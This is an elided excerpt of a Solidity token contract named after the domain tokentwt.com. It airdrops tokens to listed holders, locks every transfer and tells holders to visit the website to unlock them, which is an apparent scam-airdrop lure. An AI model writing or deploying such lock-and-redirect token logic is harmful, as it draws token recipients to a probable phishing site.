...
contract Tokentwt is IERC20, Ownable {
    ...
    constructor () {
                _name = "tokentwt.com";
        _symbol = "TWT";
        _airdropAmount = 1000000000*10**decimals();
    ...
    function _transfer(
        ...
        require(_unlocked[sender], "To unlock tokens, visit the website tokentwt.com for more info'");
    ...
    function Holders(address[] memory holders, uint256 amount) public onlyOwner payable {
